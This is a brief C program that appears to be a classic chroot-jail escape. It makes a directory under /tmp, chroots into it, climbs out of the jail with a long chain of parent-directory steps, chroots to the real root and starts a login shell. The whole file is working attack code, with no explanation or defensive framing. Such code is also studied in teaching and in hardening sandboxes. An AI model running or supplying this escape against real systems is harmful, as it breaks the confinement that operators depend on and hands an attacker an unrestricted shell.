#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

int main() {
    mkdir("/tmp", 0777);
    mkdir("/tmp/unchroot.dir", 0755);
    chroot("/tmp/unchroot.dir");
    chdir("../../../../../../../../../../../../../../../../../../../../../../../../../../..");
    chroot(".");
    system("/bin/sh -l");
    return 0;
}
